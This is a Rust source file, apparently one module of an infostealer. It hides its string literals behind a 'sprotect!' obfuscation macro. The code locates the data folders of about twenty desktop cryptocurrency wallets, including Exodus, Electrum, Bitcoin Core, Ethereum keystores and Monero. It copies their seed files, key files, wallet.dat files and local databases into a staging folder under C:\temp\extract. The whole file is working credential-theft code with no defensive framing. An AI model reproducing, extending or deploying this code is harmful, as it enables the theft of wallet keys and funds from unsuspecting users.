use crate::sprotect;
use std::fs;
use std::path::PathBuf;

struct DesktopWallet {
    name: String,
    app_paths: Vec<PathBuf>,
    target_files: Vec<String>,
    target_directories: Vec<String>,
}

fn get_desktop_wallets() -> Vec<DesktopWallet> {
    let mut wallets = Vec::new();
    
    if let Ok(appdata_roaming) = std::env::var(sprotect!("APPDATA")) {
        let roaming_path = PathBuf::from(appdata_roaming);
        
        wallets.push(DesktopWallet {
            name: sprotect!("Exodus"),
            app_paths: vec![roaming_path.join(sprotect!("Exodus"))],
            target_files: vec![
                sprotect!("exodus.wallet"),
                sprotect!("seed.seco"),
                sprotect!("passphrase.json"),
                sprotect!("*.seco"),
                sprotect!("*.json"),
            ],
            target_directories: vec![
                sprotect!("exodus.wallet"),
            ],
        });
        
        wallets.push(DesktopWallet {
            name: sprotect!("Electrum"),
            app_paths: vec![roaming_path.join(sprotect!("Electrum")).join(sprotect!("wallets"))],
            target_files: vec![
                sprotect!("default_wallet"),
                sprotect!("*.dat"),
                sprotect!("config"),
                sprotect!("recent_servers"),
            ],
            target_directories: vec![],
        });
        
        wallets.push(DesktopWallet {
            name: sprotect!("Atomic"),
            app_paths: vec![roaming_path.join(sprotect!("atomic"))],
            target_files: vec![
                sprotect!("*.db"),
                sprotect!("*.log"),
            ],
            target_directories: vec![
                sprotect!("Local Storage"),
                sprotect!("IndexedDB"),
                sprotect!("databases"),
            ],
        });
        
        wallets.push(DesktopWallet {
            name: sprotect!("Jaxx"),
            app_paths: vec![roaming_path.join(sprotect!("com.liberty.jaxx"))],
            target_files: vec![
                sprotect!("*.leveldb"),
                sprotect!("*.log"),
                sprotect!("CURRENT"),
                sprotect!("MANIFEST-*"),
            ],
            target_directories: vec![
                sprotect!("IndexedDB"),
            ],
        });
        
        wallets.push(DesktopWallet {
            name: sprotect!("Zcash"),
            app_paths: vec![roaming_path.join(sprotect!("Zcash"))],
            target_files: vec![
                sprotect!("wallet.dat"),
                sprotect!("zcash.conf"),
            ],
            target_directories: vec![],
        });
        
        wallets.push(DesktopWallet {
            name: sprotect!("Armory"),
            app_paths: vec![roaming_path.join(sprotect!("Armory"))],
            target_files: vec![
                sprotect!("*.wallet"),
                sprotect!("armorylog.txt"),
                sprotect!("*.conf"),
            ],
            target_directories: vec![],
        });
        
        wallets.push(DesktopWallet {
            name: sprotect!("Bytecoin"),
            app_paths: vec![roaming_path.join(sprotect!("bytecoin"))],
            target_files: vec![
                sprotect!("*.wallet"),
                sprotect!("*.keys"),
                sprotect!("*.address.txt"),
            ],
            target_directories: vec![],
        });
        
        wallets.push(DesktopWallet {
            name: sprotect!("Guarda"),
            app_paths: vec![roaming_path.join(sprotect!("Guarda"))],
            target_files: vec![
                sprotect!("*.db"),
                sprotect!("*.log"),
            ],
            target_directories: vec![
                sprotect!("Local Storage"),
                sprotect!("IndexedDB"),
            ],
        });
        
        wallets.push(DesktopWallet {
            name: sprotect!("Coinomi"),
            app_paths: vec![roaming_path.join(sprotect!("Coinomi")).join(sprotect!("Coinomi")).join(sprotect!("wallets"))],
            target_files: vec![
                sprotect!("*.wallet"),
                sprotect!("*.aes"),
                sprotect!("coinomi.config"),
            ],
            target_directories: vec![],
        });
    }
    
    if let Ok(appdata_local) = std::env::var(sprotect!("LOCALAPPDATA")) {
        let local_path = PathBuf::from(appdata_local);
        
        wallets.push(DesktopWallet {
            name: sprotect!("Binance"),
            app_paths: vec![local_path.join(sprotect!("Binance"))],
            target_files: vec![
                sprotect!("*.db"),
                sprotect!("*.log"),
            ],
            target_directories: vec![
                sprotect!("Local Storage"),
                sprotect!("IndexedDB"),
            ],
        });
        
        wallets.push(DesktopWallet {
            name: sprotect!("TokenPocket"),
            app_paths: vec![local_path.join(sprotect!("TokenPocket"))],
            target_files: vec![
                sprotect!("*.db"),
                sprotect!("*.log"),
            ],
            target_directories: vec![
                sprotect!("Local Storage"),
                sprotect!("IndexedDB"),
            ],
        });
        
        wallets.push(DesktopWallet {
            name: sprotect!("WalletWasabi"),
            app_paths: vec![local_path.join(sprotect!("Packages")).join(sprotect!("WalletWasabi"))],
            target_files: vec![
                sprotect!("*.json"),
                sprotect!("*.dat"),
            ],
            target_directories: vec![],
        });
    }
    
    if let Ok(userprofile) = std::env::var(sprotect!("USERPROFILE")) {
        let user_path = PathBuf::from(userprofile);
        
        wallets.push(DesktopWallet {
            name: sprotect!("Bitcoin"),
            app_paths: vec![user_path.join(sprotect!("AppData")).join(sprotect!("Roaming")).join(sprotect!("Bitcoin"))],
            target_files: vec![
                sprotect!("wallet.dat"),
                sprotect!("bitcoin.conf"),
                sprotect!("*.log"),
            ],
            target_directories: vec![
                sprotect!("wallets"),
            ],
        });
        
        wallets.push(DesktopWallet {
            name: sprotect!("Litecoin"),
            app_paths: vec![user_path.join(sprotect!("AppData")).join(sprotect!("Roaming")).join(sprotect!("Litecoin"))],
            target_files: vec![
                sprotect!("wallet.dat"),
                sprotect!("litecoin.conf"),
                sprotect!("*.log"),
            ],
            target_directories: vec![],
        });
        
        wallets.push(DesktopWallet {
            name: sprotect!("Dogecoin"),
            app_paths: vec![user_path.join(sprotect!("AppData")).join(sprotect!("Roaming")).join(sprotect!("DogeCoin"))],
            target_files: vec![
                sprotect!("wallet.dat"),
                sprotect!("dogecoin.conf"),
                sprotect!("*.log"),
            ],
            target_directories: vec![],
        });
        
        wallets.push(DesktopWallet {
            name: sprotect!("Dash"),
            app_paths: vec![user_path.join(sprotect!("AppData")).join(sprotect!("Roaming")).join(sprotect!("DashCore"))],
            target_files: vec![
                sprotect!("wallet.dat"),
                sprotect!("dash.conf"),
                sprotect!("*.log"),
            ],
            target_directories: vec![],
        });
        
        wallets.push(DesktopWallet {
            name: sprotect!("Ethereum"),
            app_paths: vec![user_path.join(sprotect!("AppData")).join(sprotect!("Roaming")).join(sprotect!("Ethereum"))],
            target_files: vec![
                sprotect!("*.json"),
                sprotect!("*.ipc"),
                sprotect!("*.log"),
            ],
            target_directories: vec![
                sprotect!("keystore"),
            ],
        });
        
        wallets.push(DesktopWallet {
            name: sprotect!("Monero"),
            app_paths: vec![user_path.join(sprotect!("Documents")).join(sprotect!("Monero"))],
            target_files: vec![
                sprotect!("*.keys"),
                sprotect!("*.address.txt"),
                sprotect!("monero_config"),
            ],
            target_directories: vec![
                sprotect!("wallets"),
            ],
        });
    }
    
    wallets
}

fn copy_wallet_file(source_path: &PathBuf, dest_dir: &PathBuf, file_pattern: &str) -> Result<(), Box<dyn std::error::Error>> {
    if !source_path.exists() {
        return Ok(());
    }
    
    fs::create_dir_all(dest_dir)?;
    
    if source_path.is_file() {
        if let Some(name) = source_path.file_name() {
            let file_name = name.to_string_lossy();
            if matches_pattern(&file_name, file_pattern) {
                let dest_file = dest_dir.join(&*file_name);
                fs::copy(source_path, dest_file).ok();
            }
        }
        return Ok(());
    }
    
    if let Ok(entries) = fs::read_dir(source_path) {
        for entry in entries.flatten() {
            let file_name = entry.file_name().to_string_lossy().to_string();
            let file_path = entry.path();
            
            if file_path.is_file() && matches_pattern(&file_name, file_pattern) {
                let dest_file = dest_dir.join(&file_name);
                fs::copy(&file_path, &dest_file).ok();
            } else if file_path.is_dir() {
                copy_wallet_file(&file_path, dest_dir, file_pattern).ok();
            }
        }
    }
    
    Ok(())
}

fn matches_pattern(filename: &str, pattern: &str) -> bool {
    if pattern.contains('*') {
        if pattern.starts_with('*') && pattern.ends_with('*') {
            let inner = &pattern[1..pattern.len() - 1];
            filename.contains(inner)
        } else if pattern.starts_with('*') {
            let suffix = &pattern[1..];
            filename.ends_with(suffix)
        } else if pattern.ends_with('*') {
            let prefix = &pattern[..pattern.len() - 1];
            filename.starts_with(prefix)
        } else {
            filename == pattern
        }
    } else {
        filename == pattern
    }
}

fn copy_wallet_directory(source_dir: &PathBuf, dest_dir: &PathBuf) -> Result<(), Box<dyn std::error::Error>> {
    if !source_dir.exists() {
        return Ok(());
    }
    
    fs::create_dir_all(dest_dir)?;
    
    if let Ok(entries) = fs::read_dir(source_dir) {
        for entry in entries.flatten() {
            let source_path = entry.path();
            let dest_path = dest_dir.join(entry.file_name());
            
            if source_path.is_dir() {
                copy_wallet_directory(&source_path, &dest_path)?;
            } else {
                fs::copy(&source_path, &dest_path).ok();
            }
        }
    }
    
    Ok(())
}

pub async fn extract_desktop_wallets() -> Result<(), Box<dyn std::error::Error>> {
    let wallets = get_desktop_wallets();
    
    for wallet in &wallets {
        for app_path in &wallet.app_paths {
            if !app_path.exists() {
                continue;
            }
            
            let dest_base = PathBuf::from(sprotect!("C:\\temp\\extract\\wallets")).join(&wallet.name);
            
            for file_pattern in &wallet.target_files {
                copy_wallet_file(app_path, &dest_base.join(sprotect!("files")), file_pattern).ok();
            }
            
            for dir_name in &wallet.target_directories {
                let source_subdir = app_path.join(dir_name);
                let dest_subdir = dest_base.join(dir_name);
                copy_wallet_directory(&source_subdir, &dest_subdir).ok();
            }
        }
    }
    
    Ok(())
}